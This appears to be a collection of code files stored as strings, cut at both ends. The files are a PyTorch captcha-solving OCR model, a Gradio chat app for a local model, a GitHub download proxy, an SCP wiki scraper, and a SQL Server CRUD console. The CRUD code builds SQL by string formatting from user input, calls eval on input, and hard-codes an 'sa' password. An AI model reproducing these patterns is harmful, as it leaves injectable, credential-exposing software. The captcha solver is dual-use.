\u5728PyTorch\u4e2d\uff0c-1\u4f5c\u4e3a\u4e00\u4e2a\u7279\u6b8a\u7684\u503c\uff0c\u8868\u793a\u8be5\u7ef4\u5ea6\u7684\u5927\u5c0f\u5c06\u5728\u8fd0\u884c\u65f6\u81ea\u52a8\u8ba1\u7b97\uff0c\u4ee5\u786e\u4fdd\u603b\u4f53\u79ef\uff08\u5143\u7d20\u603b\u6570\uff09\u4fdd\u6301\u4e0d\u53d8\u3002\u5b83\u5141\u8bb8\u7528\u6237\u5728\u4e0d\u77e5\u9053\u786e\u5207\u503c\u7684\u60c5\u51b5\u4e0b\u8c03\u6574\u5176\u4ed6\u7ef4\u5ea6\uff0c\u53ea\u8981\u603b\u4f53\u79ef\u5339\u914d\u5373\u53ef\u3002\n            \u5728\u8fd9\u91cc\uff0c-1\u610f\u5473\u7740\u5c06\u5269\u4f59\u7684\u6240\u6709\u5143\u7d20\u90fd\u5206\u914d\u5230\u8fd9\u4e2a\u7ef4\u5ea6\u4e0a\uff0c\u5f62\u6210\u4e00\u4e2a\u5217\u5411\u91cf\u3002\n        \u603b\u4f53\u6765\u8bf4\uff0c.view(1, -1)\u7684\u4f5c\u7528\u662f\u5c06__text2vec()\u8fd4\u56de\u7684\u7ed3\u679c\u8f6c\u6362\u4e3a\u5f62\u72b6\u4e3a (1, N) \u7684\u5f20\u91cf\uff0c\u5176\u4e2d N \u662f\u539f\u59cb\u5411\u91cf\u7684\u957f\u5ea6\uff0c\u786e\u4fdd\u4e86\u6570\u636e\u6ee1\u8db3\u6a21\u578b\u6240\u9700\u7684\u8f93\u5165\u683c\u5f0f\uff08\u5355\u6837\u672c\u3001\u4e00\u5217\u5411\u91cf\uff09\u3002\n        [0]: \u6700\u540e\uff0c\u901a\u8fc7\u7d22\u5f15\u64cd\u4f5c\u53d6\u51fa\u91cd\u5851\u540e\u7684\u5f20\u91cf\u7684\u7b2c\u4e00\u4e2a\uff08\u4e5f\u662f\u552f\u4e00\u4e00\u4e2a\uff09\u5143\u7d20\u3002\u7531\u4e8e\u5df2\u7ecf\u901a\u8fc7view(1, -1)\u786e\u4fdd\u4e86\u6570\u636e\u662f\u4e00\u4e2a\u6279\u91cf\u5927\u5c0f\u4e3a1\u7684\u5f20\u91cf\uff0c\n            \u8fd9\u91cc\u7684\u64cd\u4f5c\u5b9e\u9645\u4e0a\u53ea\u662f\u53bb\u9664\u6389\u4e86\u591a\u4f59\u7684\u6279\u91cf\u7ef4\u5ea6\uff0c\u76f4\u63a5\u8fd4\u56de\u7ecf\u8fc7\u7f16\u7801\u548c\u91cd\u5851\u7684\u5355\u4e2a\u9a8c\u8bc1\u7801\u5411\u91cf\u3002\n        '''\n        captcha = self.__text2vec(captcha).view(1, -1)[0]  # tools.explain.view\n        return image_transform, captcha\n\n    def __len__(self):\n        return self.__list_image_path.__len__()\n\n    def __text2vec(self, text):\n        \"\"\"\n        \u5c06\u6587\u672c\u8f6c\u6362\u4e3a\u5411\u91cf\u8868\u793a\u3002\n\n        \u53c2\u6570:\n        text: str, \u8f93\u5165\u7684\u6587\u672c\u5b57\u7b26\u4e32\uff0c\u9884\u671f\u4e3a\u9a8c\u8bc1\u7801\u7b49\u77ed\u5b57\u7b26\u4e32\u3002\n\n        \u8fd4\u56de\u503c:\n        vecs: torch.Tensor, \u8f6c\u6362\u540e\u7684\u5411\u91cf\u8868\u793a\uff0c\u5176\u4e2dvecs\u7684shape\u4e3a(captcha_length, captcha_array_length)\uff0c\n              \u6bcf\u4e2a\u4f4d\u7f6e\u4e0a\u7684\u503c\u8868\u793a\u5bf9\u5e94\u5b57\u7b26\u5728\u8be5\u6587\u672c\u4e2d\u662f\u5426\u51fa\u73b0\uff0c\u51fa\u73b0\u5219\u4e3a1\uff0c\u4e0d\u51fa\u73b0\u5219\u4e3a0\u3002\n        \"\"\"\n        # \u521d\u59cb\u5316\u4e00\u4e2a\u5168\u96f6\u7684\u5411\u91cf\uff0c\u5176\u5927\u5c0f\u6839\u636e\u9a8c\u8bc1\u7801\u957f\u5ea6\u548c\u5b57\u7b26\u96c6\u5927\u5c0f\u786e\u5b9a\n        vecs = torch.zeros((tool.captcha_lenth, tool.captcha_array.__len__()))\n        for i in range(len(text)):\n            # \u5bf9\u4e8e\u6587\u672c\u4e2d\u7684\u6bcf\u4e2a\u5b57\u7b26\uff0c\u5c06\u5176\u5728\u5411\u91cf\u4e2d\u7684\u4f4d\u7f6e\u8bbe\u7f6e\u4e3a1\n            vecs[i][tool.captcha_array.index(text[i])] = 1\n        return vecs\n\n    @staticmethod\n    def vec2text(vec):\n        '''\n        \u5c06\u5411\u91cf\u8f6c\u6362\u4e3a\u6587\u672c\u8868\u793a\u3002\n\n        :param vec:\n        :return:\n        '''\n        # \u83b7\u53d6\u5411\u91cf\u4e2d\u6bcf\u4e2a\u4f4d\u7f6e\u4e0a\u503c\u4e3a1\u7684\u7d22\u5f15\uff0c\u5373\u4e3a\u5b57\u7b26\u5728\u5b57\u7b26\u96c6\u7684\u4f4d\u7f6e\n        '''\n        vec =   [[2, 5,  3],\n                [6, 1, 7, 4],\n                [9, 8, 6, 2]]\n       \u6267\u884c vec=torch.argmax(vec, dim=1) \u540e\uff0c\u5f97\u5230\u7684\u65b0\u5f20\u91cf\u5c06\u662f\uff1a\n       result = [1, 2, 0] \n        result[0]=1\uff08\u7d22\u5f15\u4e3a0\uff09\u7684\u6700\u5927\u503c\u4f4d\u4e8e\u7b2c1\u5217\uff08\u7d22\u5f15\u4e3a1\uff09\uff0c\u5373 5\uff1b\n        result[1]=2 \u8868\u793a\u7b2c\u4e8c\u884c\u6700\u5927\u503c\u5728\u7b2c2\u5217\uff08\u503c\u4e3a 7\uff09\uff0c\n        result[2]=0 \u8868\u793a\u7b2c\u4e09\u884c\u6700\u5927\u503c\u5728\u7b2c0\u5217\uff08\u503c\u4e3a 9\uff09\u3002\n        '''\n        vecs = torch.argmax(vec, dim=1)\n        return ''.join([tool.captcha_array[i] for i in vecs])\n\n\nclass CaptchaOCRModel(nn.Module):\n    \"\"\"\n    CaptchaOCRModel \u7c7b\u7528\u4e8e\u5b9a\u4e49\u4e00\u4e2a\u9488\u5bf9\u9a8c\u8bc1\u7801\u8bc6\u522b\u7684\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\u6a21\u578b\u3002\n\n    \u8be5\u6a21\u578b\u57fa\u4e8eResNet50\u67b6\u6784\u8fdb\u884c\u6539\u9020\uff0c\u4ee5\u9002\u5e94\u9a8c\u8bc1\u7801\u56fe\u50cf\u7684\u8bc6\u522b\u4efb\u52a1\u3002\n    \"\"\"\n\n    def __init__(self):\n        \"\"\"\n        \u521d\u59cb\u5316CaptchaOCRModel\u5b9e\u4f8b\u3002\n\n        \"\"\"\n        super(CaptchaOCRModel, self).__init__()\n        # \u521d\u59cb\u5316ResNet50\u6a21\u578b\uff0c\u4e0d\u52a0\u8f7d\u9884\u8bad\u7ec3\u6743\u91cd\n        self.__model = models.resnet50(weights=None)\n        # \u4fee\u6539\u8f93\u5165\u5c42 \u4fee\u6539ResNet50\u7684\u8f93\u5165\u5c42\u4ee5\u9002\u5e94\u5355\u901a\u9053\u8f93\u5165\u3002 \u76f4\u63a5\u6253\u5370 model \u67e5\u770b\u539f\u59cb\u4fe1\u606f\n        self.__model.conv1 = nn.Conv2d(1, 64, kernel_size=(7, 7), stride=(2, 2), padding=(3, 3), bias=False)\n        # \u4fee\u6539\u8f93\u51fa\u5c42 \u4fee\u6539\u6700\u540e\u4e00\u5c42\u5168\u8fde\u63a5\u5c42\uff0c\u4ee5\u8f93\u51fa\u4e0e\u9a8c\u8bc1\u7801\u957f\u5ea6\u548c\u5b57\u7b26\u96c6\u5927\u5c0f\u76f8\u5e94\u7684\u7c7b\u522b\u6570\u3002\n        self.__model.fc = nn.Linear(in_features=2048, out_features=tool.captcha_lenth * tool.captcha_array.__len__())\n\n    def forward(self, x):\n        \"\"\"\n        \u5b9a\u4e49\u6a21\u578b\u7684\u524d\u5411\u4f20\u64ad\u8def\u5f84\u3002\n\n        \u53c2\u6570:\n        - x : \u8f93\u5165\u56fe\u50cf\u7684\u5f20\u91cf\n\n        \u8fd4\u56de\u503c:\n    ",
    "import gradio as gr  # to create the web UI for the application\nfrom openai import OpenAI  # to interact with LM Studio models\nimport re  # for text manipulation\n\n# ANSI escape code for colors\nRESET_COLOR = '\\033[0m'\nNEON_GREEN = '\\033[92m'\n\nclient = OpenAI(base_url=\"http://[add_local_host_here]\", api_key=\"lm-studio\")\n\n# Initialize an empty list to store conversation history\nconversation_history = []\n\ndef format_response_text(text):\n    \"\"\"\n    Formats the response text for improved readability.\n    :param text: The raw response text.\n    :return: Formatted text.\n    \"\"\"\n    # New paragraphs after each period, question mark, or exclamation point\n    text = re.sub(r'(?<=[.!?])\\s+(?=[A-Z])', '\\n\\n', text)\n    \n    # Properly indent bullet points and numbered lists\n    text = re.sub(r'(\\n)?(\\s*)?([\u2022\\-*]|\\d+\\.)\\s+', r'\\n    \\3 ', text)\n    \n    return text\n\ndef mistral_streamed_interaction(user_input, conversation_history):\n    \"\"\"\n    Interacts with the mistral model via LM Studio, maintaining conversation context.\n    :param user_input: String, user's input.\n    :param conversation_history: List, the conversation history.\n    :return: Tuple, containing the response and updated conversation history.\n    \"\"\"\n    # Add user's input to conversation history\n    conversation_history.append({\"role\": \"user\", \"content\": user_input})\n\n    streamed_completion = client.chat.completions.create(\n        model=\"TheBloke/dolphin-2.2.1-mistral-7B-GGUF/dolphin-2.2.1-mistral-7b.Q4_K_S.gguf\",\n        messages=conversation_history,\n        stream=True  # Enable streaming\n    )\n\n    full_response = \"\"\n    line_buffer = \"\"\n\n    for chunk in streamed_completion:\n        delta_content = chunk.choices[0].delta.content\n        if delta_content:\n            line_buffer += delta_content\n            if '\\n' in line_buffer:\n                lines = line_buffer.split('\\n')\n                full_response += '\\n'.join(lines[:-1])\n                line_buffer = lines[-1]\n\n    if line_buffer:\n        full_response += line_buffer\n\n    full_response = format_response_text(full_response)\n\n    # Add model's response to conversation history\n    conversation_history.append({\"role\": \"system\", \"content\": full_response})\n\n    return full_response, conversation_history\n\ndef clear_conversation_history():\n    \"\"\"\n    Clears the conversation history.\n    \"\"\"\n    global conversation_history\n    conversation_history = []\n    print(\"Conversation history cleared.\")\n\n\ndef gradio_interface_interaction(user_input):\n    \"\"\"\n    This function acts as the bridge between the Gradio interface and the chat logic.\n    It processes the user input via the existing chat logic and returns the response.\n    \n    :param user_input: User input from the Gradio interface.\n    :return: Response text to be displayed in the Gradio interface.\n    \"\"\"\n    # Call the existing chat interaction function with the global conversation history\n    response, _ = mistral_streamed_interaction(user_input, conversation_history)\n    return response\n\n\n# Modify the Gradio interface to use the new interaction function\niface = gr.Interface(\n    fn=gradio_interface_interaction,\n    inputs=gr.Textbox(lines=2, placeholder=\"Enter your prompt here\"),\n    outputs=gr.Textbox(),\n)\n\n# Launch the Gradio interface\niface.launch()\n\n",
    "# -*- coding: utf-8 -*-\nimport re\n\nimport requests\nfrom flask import Flask, Response, redirect, request\nfrom requests.exceptions import (\n    ChunkedEncodingError,\n    ContentDecodingError, ConnectionError, StreamConsumedError)\nfrom requests.utils import (\n    stream_decode_response_unicode, iter_slices, CaseInsensitiveDict)\nfrom urllib3.exceptions import (\n    DecodeError, ReadTimeoutError, ProtocolError)\nfrom urllib.parse import quote\n\n# config\n# \u5206\u652f\u6587\u4ef6\u4f7f\u7528jsDelivr\u955c\u50cf\u7684\u5f00\u5173\uff0c0\u4e3a\u5173\u95ed\uff0c\u9ed8\u8ba4\u5173\u95ed\njsdelivr = 0\nsize_limit = 1024 * 1024 * 1024 * 999  # \u5141\u8bb8\u7684\u6587\u4ef6\u5927\u5c0f\uff0c\u9ed8\u8ba4999GB\uff0c\u76f8\u5f53\u4e8e\u65e0\u9650\u5236\u4e86 https://github.com/hunshcn/gh-proxy/issues/8\n\n\"\"\"\n  \u5148\u751f\u6548\u767d\u540d\u5355\u518d\u5339\u914d\u9ed1\u540d\u5355\uff0cpass_list\u5339\u914d\u5230\u7684\u4f1a\u76f4\u63a5302\u5230jsdelivr\u800c\u5ffd\u7565\u8bbe\u7f6e\n  \u751f\u6548\u987a\u5e8f \u767d->\u9ed1->pass\uff0c\u53ef\u4ee5\u524d\u5f80https://github.com/hunshcn/gh-proxy/issues/41 \u67e5\u770b\u793a\u4f8b\n  \u6bcf\u4e2a\u89c4\u5219\u4e00\u884c\uff0c\u53ef\u4ee5\u5c01\u7981\u67d0\u4e2a\u7528\u6237\u7684\u6240\u6709\u4ed3\u5e93\uff0c\u4e5f\u53ef\u4ee5\u5c01\u7981\u67d0\u4e2a\u7528\u6237\u7684\u7279\u5b9a\u4ed3\u5e93\uff0c\u4e0b\u65b9\u7528\u9ed1\u540d\u5355\u793a\u4f8b\uff0c\u767d\u540d\u5355\u540c\u7406\n  user1 # \u5c01\u7981user1\u7684\u6240\u6709\u4ed3\u5e93\n  user1/repo1 # \u5c01\u7981user1\u7684repo1\n  */repo1 # \u5c01\u7981\u6240\u6709\u53eb\u505arepo1\u7684\u4ed3\u5e93\n\"\"\"\nwhite_list = '''\n'''\nblack_list = '''\n'''\npass_list = '''\n'''\n\nHOST = '127.0.0.1'  # \u76d1\u542c\u5730\u5740\uff0c\u5efa\u8bae\u76d1\u542c\u672c\u5730\u7136\u540e\u7531web\u670d\u52a1\u5668\u53cd\u4ee3\nPORT = 59740  # \u76d1\u542c\u7aef\u53e3\nwith open(\"./index.html\", \"r\") as f:\n    index_html = f.read()  # \u4e3b\u9875\n\nwhite_list = [tuple([x.replace(' ', '') for x in i.split('/')]) for i in white_list.split('\\n') if i]\nblack_list = [tuple([x.replace(' ', '') for x in i.split('/')]) for i in black_list.split('\\n') if i]\npass_list = [tuple([x.replace(' ', '') for x in i.split('/')]) for i in pass_list.split('\\n') if i]\napp = Flask(__name__)\nCHUNK_SIZE = 1024 * 10\n\nexp1 = re.compile(r'^(?:https?://)?github\\.com/(?P<author>.+?)/(?P<repo>.+?)/(?:releases|archive)/.*$')\nexp2 = re.compile(r'^(?:https?://)?github\\.com/(?P<author>.+?)/(?P<repo>.+?)/(?:blob|raw)/.*$')\nexp3 = re.compile(r'^(?:https?://)?github\\.com/(?P<author>.+?)/(?P<repo>.+?)/(?:info|git-).*$')\nexp4 = re.compile(r'^(?:https?://)?raw\\.(?:githubusercontent|github)\\.com/(?P<author>.+?)/(?P<repo>.+?)/.+?/.+$')\nexp5 = re.compile(r'^(?:https?://)?gist\\.(?:githubusercontent|github)\\.com/(?P<author>.+?)/.+?/.+$')\n\nrequests.sessions.default_headers = lambda: CaseInsensitiveDict()\n\n@app.route('/')\ndef index():\n    if 'q' in request.args:\n        return redirect('/' + request.args.get('q'))\n    return index_html\n\nfrom flask import send_file\n@app.route('/favicon.ico')\ndef icon():\n    return send_file('./favicon.ico', mimetype='image/vnd.microsoft.icon')\n\ndef iter_content(self, chunk_size=1, decode_unicode=False):\n    \"\"\"rewrite requests function, set decode_content with False\"\"\"\n\n    def generate():\n        # Special case for urllib3.\n        if hasattr(self.raw, 'stream'):\n            try:\n                for chunk in self.raw.stream(chunk_size, decode_content=False):\n                    yield chunk\n            except ProtocolError as e:\n                raise ChunkedEncodingError(e)\n            except DecodeError as e:\n                raise ContentDecodingError(e)\n            except ReadTimeoutError as e:\n                raise ConnectionError(e)\n        else:\n            # Standard file-like object.\n            while True:\n                chunk = self.raw.read(chunk_size)\n                if not chunk:\n                    break\n                yield chunk\n\n        self._content_consumed = True\n\n    if self._content_consumed and isinstance(self._content, bool):\n        raise StreamConsumedError()\n    elif chunk_size is not None and not isinstance(chunk_size, int):\n        raise TypeError(\"chunk_size must be an int, it is instead a %s.\" % type(chunk_size))\n    # simulate reading small chunks of the content\n    reused_chunks = iter_slices(self._content, chunk_size)\n\n    stream_chunks = generate()\n\n    chunks = reused_chunks if self._content_consumed else stream_chunks\n\n    if decode_unicode:\n        chunks = stream_decode_response_unicode(chunks, self)\n\n    return chunks\n\n\ndef check_url(u):\n    for exp in (exp1, exp2, exp3, exp4, exp5):\n        m = exp.match(u)\n        if m:\n            return m\n    return False\n\n\n@app.route('/<path:u>', methods=['GET', 'POST'])\ndef handler(u):\n    u = u if u.startswith('http') else 'https://' + u\n    if u.rfind('://', 3, 9) == -1:\n        u = u.replace('s:/', 's://', 1)  # uwsgi\u4f1a\u5c06//\u4f20\u9012\u4e3a/\n    pass_by = False\n    m = check_url(u)\n    if m:\n        m = tuple(m.groups())\n        if white_list:\n            for i in white_list:\n                if m[:len(i)] == i or i[0] == '*' and len(m) == 2 and m[1] == i[1]:\n                    break\n            else:\n                return Response('Forbidden by white list.', status=403)\n        for i in black_list:\n            if m[:len(i)] == i or i[0] == '*' and len(m) == 2 and m[1] == i[1]:\n                return Response('Forbidden by black list.', status=403)\n        for i in pass_list:\n            if m[:len(i)] == i or i[0] == '*' and len(m) == 2 and m[1] == i[1]:\n                pass_by = True\n                break\n    else:\n        return Response('Invalid input.', status=403)\n\n    if (jsdelivr or pass_by) and exp2.match(u):\n        u = u.replace('/blob/', '@', 1).replace('github.com', 'cdn.jsdelivr.net/gh', 1)\n        return redirect(u)\n    elif (jsdelivr o",
    "import requests\r\nfrom bs4 import BeautifulSoup\r\nimport os\r\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\r\n\r\nerror=open (\"error.txt\",\"w\", encoding=\"UTF-8\")\r\n\r\n\r\n# \u786e\u4fddscp_md\u6587\u4ef6\u5939\u5b58\u5728\r\nif not os.path.exists('scp_md'):\r\n    os.makedirs('scp_md')\r\n\r\ndef scrape_scp_page(url):\r\n    content = None\r\n    img_url = None\r\n    img_introduce = None\r\n    title = None\r\n    try:\r\n        response = requests.get(url)\r\n        response.encoding = 'utf-8'\r\n        soup = BeautifulSoup(response.text, 'html.parser')\r\n        title_tag = soup.find('title')\r\n        if title_tag:\r\n            title = title_tag.text.replace(' - SCP\u57fa\u91d1\u4f1a', '').strip()\r\n        excluded_texts = [\"\u6a94\u6848\u540d\u7a31\", \"\u5716\u50cf\u540d\u7a31\", \"\u5716\u50cf\u4f5c\u8005\", \"\u5716\u50cf\u6388\u6b0a\u5354\u8b70\", \"\u9023\u7d50\", \"\u53c3\u8003\u8cc7\u6599\", \"\u8acb\u5728\u5f15\u7528\u8a72\u9801\u9762\u6642\", \"1234\", \"\u7db2\u7ad9\u8cc7\u8a0a\u67e5\u8a62\", \"\u7ffb\u8b6f\u5c08\u5340\", \"\u7d9c\u5408\u5275\u4f5c\", \"SCP\u6a94\u6848\", \"\u7db2\u7ad9\u8fde\u7ed3\", \"**Content:**\"]\r\n        caption_divs = soup.select('div.scp-image-caption')\r\n        excluded_paragraphs = set()\r\n        for div in caption_divs:\r\n            excluded_paragraphs.update(div.find_all('p'))\r\n        strong_paragraphs = [\r\n            p for p in soup.find_all('p')\r\n            if not p.find('a') and all(excluded_text not in p.text for excluded_text in excluded_texts) and p not in excluded_paragraphs\r\n        ]\r\n        content = '\\n\\n'.join(p.text for p in strong_paragraphs)\r\n        img_blocks = soup.select('div.scp-image-block.block-right')\r\n        if img_blocks:\r\n            img_block = img_blocks[0]\r\n            img_element = img_block.find('img')\r\n            img_url = img_element['src'] if img_element else None\r\n            img_caption_div = img_block.find('div', class_='scp-image-caption')\r\n            if img_caption_div:\r\n                img_introduce = img_caption_div.text.strip()\r\n    except Exception as e:\r\n        raise Exception(f\"An error occurred: {str(e)}\")\r\n    return {'title': title, 'img_url': img_url, 'img_introduce': img_introduce, 'content': content}\r\n\r\ndef process_url(url):\r\n    try:\r\n        result = scrape_scp_page(url)\r\n        scp_number = url.split('/')[-1]\r\n        file_path = f\"scp_md/{scp_number}.md\"\r\n        full_content = (f\"# {result['title']}\\n\\n\" if result['title'] else \"\") + \\\r\n                       (f\"![Image]({result['img_url']})\\n\\n\" if result['img_url'] else \"\") + \\\r\n                       (f\"**\u56fe\u7247\u4ecb\u7ecd\uff1a** {result['img_introduce']}\\n\\n\" if result['img_introduce'] else \"\") + \\\r\n                       (f\"{result['content']}\\n\\n\" if result['content'] else \"\")\r\n        if len(full_content) < 159:\r\n            raise ValueError(f\"Content length for {url} is less than 159 characters.\")\r\n        elif \"\u8a62\u554f\u5225\u4eba\" not in full_content:\r\n            with open(file_path, \"w\", encoding=\"UTF-8\") as file:\r\n                file.write(full_content)\r\n    except Exception as e:\r\n        error.write(f\"Error in {url}: {str(e)}\")\r\n        return f\"Error in {url}: {str(e)}\"  # \u8fd9\u91cc\u786e\u4fdd\u9519\u8bef\u4fe1\u606f\u683c\u5f0f\u6b63\u786e\r\n\r\ndef main():\r\n    urls = [f\"http://scp-zh-tr.wikidot.com/scp-{str(i).zfill(3)}\" for i in range(1, 8000)]\r\n    with ThreadPoolExecutor(max_workers=10) as executor, open(\"error.log\", \"w\", encoding=\"UTF-8\") as error_log:\r\n        futures = {executor.submit(process_url, url): url for url in urls}\r\n        for future in as_completed(futures):\r\n            result = future.result()\r\n            if result and \"Error\" in result:\r\n                error_log.write(result + \"\\n\")\r\n                error_log.flush()  # \u4f7f\u7528flush\u786e\u4fdd\u5373\u65f6\u5199\u5165\r\n                print(result)  # \u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u5230\u63a7\u5236\u53f0\r\n            else:\r\n                print(f\"Processed {futures[future]} successfully.\")\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n\r\n",
    "import pyodbc\r\nimport sys\r\ndriver=\"{ODBC Driver 17 for SQL Server}\"\r\nserver=\"DESKTOP-HFCSV7Q\\SQLSERVER2019\"\r\ndatabase=\"\u5ba2\u6236\u8cfc\u8cb7\u8a02\u55ae\"\r\nusername=\"sa\"\r\npassword=\"12345678\"\r\nconn=pyodbc.connect(\"DRIVER=\" + driver\r\n                    + \";SERVER=\" + server\r\n                    + \";DATABASE=\" + database\r\n                    + \";UID=\" + username\r\n                    + \";PWD=\" + password)\r\n\r\n\r\n#\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n#------------------------------------------------------\r\ndef Staff_Manager():  \r\n print(\"===\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71===\")\r\n print(\"1.\u65b0\u589e\u5ba2\u6236\u8a18\u9304\")\r\n print(\"2.\u4fee\u6539\u5ba2\u6236\u8a18\u9304\")\r\n print(\"3.\u522a\u9664\u5ba2\u6236\u8a18\u9304\")\r\n print(\"4.\u67e5\u8a62\u5ba2\u6236\u8a18\u9304\")\r\n print(\"5.\u56de\u4e3b\u756b\u9762\")\r\n n=eval(input(\"\u8acb\u9078\u64c7\u300c\u5ba2\u6236\u300d\u529f\u80fd\u6e05\u55ae\uff1a\"))\r\n if n==1:\r\n   Insert_Staff()\r\n elif n==2:\r\n   Update_Staff()\r\n elif n==3:\r\n   Delete_Staff()   \r\n elif n==4:\r\n   Query_Staff()\r\n elif n==5:\r\n    Main_Menu()\r\n else:\r\n    print(\"\u8acb\u9078\u64c71~5\u9805\u529f\u80fd\")\r\n\r\ndef Check_Sid(Sid): #\u6aa2\u67e5\u7de8\u865f\u662f\u5426\u5b58\u5728\u65bc\u5ba2\u6236\u8868\u4e2d\u4e4b\u526f\u7a0b\u5f0f\r\n  SQLcmd=\"select * from \u5ba2\u6236\u8868 where \u7de8\u865f='{}'\".format(Sid)  \r\n  cursor=conn.execute(SQLcmd)\r\n  return cursor.fetchone()  #\u82e5\u7121\u8a18\u9304\u5247\u50b3\u56deNone\r\n\r\n\r\ndef Insert_Staff(): #\u65b0\u589e\u5ba2\u6236\u8a18\u9304\r\n Sid=input(\"\u7de8\u865f\uff1a\")\r\n if Check_Sid(Sid)!=None:\r\n    print(\"\u7de8\u865f:{}\u91cd\u8907\u4e86\".format(Sid))\r\n    return\r\n Sname=input(\"\u59d3\u540d\uff1a\")\r\n Tel=input(\"\u96fb\u8a71\uff1a\")\r\n City=input(\"\u57ce\u5e02\uff1a\")\r\n Area=input(\"\u5340\u57df\uff1a\")\r\n SQLcmd=\"INSERT INTO \u5ba2\u6236\u8868 VALUES ('{}','{}','{}','{}','{}')\".format(Sid, Sname,Tel, City, Area)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u65b0\u589e\u5ba2\u6236\u8a18\u9304\uff01\")\r\n Staff_Manager() #\u8fd4\u56de\u5230\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\ndef Update_Staff():  #\u4fee\u6539\u5ba2\u6236\u8a18\u9304\r\n Sid=input(\"\u7de8\u865f\uff1a\")\r\n if Check_Sid(Sid)==None:\r\n    print(\"\u67e5\u7121\u6b64\u7de8\u865f:{}\".format(Sid))\r\n    return\r\n Sname=input(\"\u59d3\u540d\uff1a\")\r\n Tel=input(\"\u96fb\u8a71\uff1a\")\r\n City=input(\"\u57ce\u5e02\uff1a\")\r\n Area=input(\"\u5340\u57df\uff1a\")\r\n SQLcmd=\"UPDATE \u5ba2\u6236\u8868 SET \u59d3\u540d='{}',\u96fb\u8a71='{}',\u57ce\u5e02='{}',\u5340\u57df='{} ' Where \u7de8\u865f='{}'\".format(Sname,Tel, City, Area, Sid)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u66f4\u65b0\u5ba2\u6236\u8a18\u9304\uff01\")\r\n Staff_Manager()   #\u8fd4\u56de\u5230\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\n\r\ndef Delete_Staff(): #\u522a\u9664\u5ba2\u6236\u8a18\u9304\r\n Sid=input(\"\u7de8\u865f\uff1a\")\r\n if Check_Sid(Sid)==None:\r\n    print(\"\u67e5\u7121\u6b64\u7de8\u865f:{}\".format(Sid))\r\n    return\r\n SQLcmd=\"Delete From \u5ba2\u6236\u8868 WHERE \u7de8\u865f='{}'\".format(Sid)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u522a\u9664\u8a18\u9304\u6210\u529f\uff01\")\r\n Staff_Manager()  #\u8fd4\u56de\u5230\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\n\r\ndef Query_Staff():  #\u67e5\u8a62\u5ba2\u6236\u8a18\u9304\r\n SQLcmd=\"select * from \u5ba2\u6236\u8868\"\r\n Record=conn.execute(SQLcmd)\r\n listStaff=list(Record.fetchall())\r\n print(\"\u7de8\u865f     \u59d3\u540d    \u96fb\u8a71    \u57ce\u5e02    \u5340\u57df\")\r\n for row in listStaff:\r\n    for col in row:\r\n        print(col, end=\"   \")\r\n    print()\r\n Record.close()\r\n Staff_Manager()  #\u8fd4\u56de\u5230\u300c\u5ba2\u6236\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n \r\n \r\n#\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n#------------------------------------------------------\r\ndef Product_Manager():  #\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n print(\"===\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71===\")\r\n print(\"1.\u65b0\u589e\u7522\u54c1\u8a18\u9304\")\r\n print(\"2.\u4fee\u6539\u7522\u54c1\u8a18\u9304\")\r\n print(\"3.\u522a\u9664\u7522\u54c1\u8a18\u9304\")\r\n print(\"4.\u67e5\u8a62\u7522\u54c1\u8a18\u9304\")\r\n print(\"5.\u56de\u4e3b\u756b\u9762\")\r\n n=eval(input(\"\u8acb\u9078\u64c7\u300c\u7522\u54c1\u300d\u529f\u80fd\u6e05\u55ae\uff1a\"))\r\n if n==1:\r\n   Insert_Product()  #\u65b0\u589e\u7522\u54c1\u8a18\u9304\r\n elif n==2:\r\n   Update_Product()  #\u4fee\u6539\u7522\u54c1\u8a18\u9304\r\n elif n==3:\r\n   Delete_Product()  #\u522a\u9664\u7522\u54c1\u8a18\u9304\r\n elif n==4:\r\n   Query_Product()   #\u67e5\u8a62\u7522\u54c1\u8a18\u9304\r\n elif n==5:\r\n    Main_Menu()      #\u56de\u4e3b\u756b\u9762\r\n else:\r\n    print(\"\u8acb\u9078\u64c71~5\u9805\u529f\u80fd\")\r\n\r\n\r\ndef CheckProduct_NO(No):\r\n  SQLcmd=\"select * from \u7522\u54c1\u8868 where \u54c1\u865f='{}'\".format(No)  \r\n  cursor=conn.execute(SQLcmd)\r\n  return cursor.fetchone()  #\u82e5\u7121\u8a18\u9304\u5247\u50b3\u56deNone\r\n\r\ndef Insert_Product():   #\u65b0\u589e\u7522\u54c1\u8a18\u9304\r\n No=input(\"\u54c1\u865f\uff1a\")\r\n if CheckProduct_NO(No)!=None:\r\n    print(\"\u7de8\u865f:{}\u91cd\u8907\u4e86\".format(No))\r\n    return\r\n Cname=input(\"\u54c1\u540d\uff1a\")\r\n Credits=input(\"\u5b9a\u50f9\uff1a\")\r\n SQLcmd=\"INSERT INTO \u7522\u54c1\u8868 VALUES ('{}','{}','{}')\".format(No,Cname,Credits)\r\n conn.execute(SQLcmd)\r\n conn.commit()\r\n print(\"\u65b0\u589e\u7522\u54c1\u8a18\u9304\uff01\")\r\n Product_Manager()  #\u8fd4\u56de\u5230\u300c\u7522\u54c1\u300d\u7ba1\u7406\u7cfb\u7d71\u4e4b\u4e3b\u756b\u9762\r\n\r\ndef Update_Product():  #\u4fee\u6539\u7522\u54c1\u8a18\u9304\r\n No=input(\"\u54c1\u865f\uff1a\")\r\n if CheckProduct_NO(No)==None:\r\n    